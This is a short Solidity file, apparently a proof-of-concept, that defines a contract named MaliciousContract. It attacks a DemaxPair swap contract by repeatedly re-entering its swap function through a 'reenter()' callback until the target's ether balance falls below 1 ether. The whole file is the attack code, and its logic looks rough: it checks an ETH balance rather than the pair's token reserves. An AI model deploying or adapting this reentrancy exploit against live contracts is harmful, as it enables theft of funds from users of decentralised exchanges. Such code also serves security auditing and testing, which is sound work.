// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "./swapContract.sol"; // Ensure this path is correct

contract MaliciousContract {
    DemaxPair public swapContract;

    constructor(DemaxPair _swapContract) public {
        swapContract = _swapContract;
    }

    function attack() external {
        swapContract.swap(1 ether, 0, address(this), abi.encodeWithSignature("reenter()"));
    }

    function reenter() external {
        if (address(swapContract).balance >= 1 ether) {
            swapContract.swap(1 ether, 0, address(this), abi.encodeWithSignature("reenter()"));
        }
    }

    receive() external payable {}
}
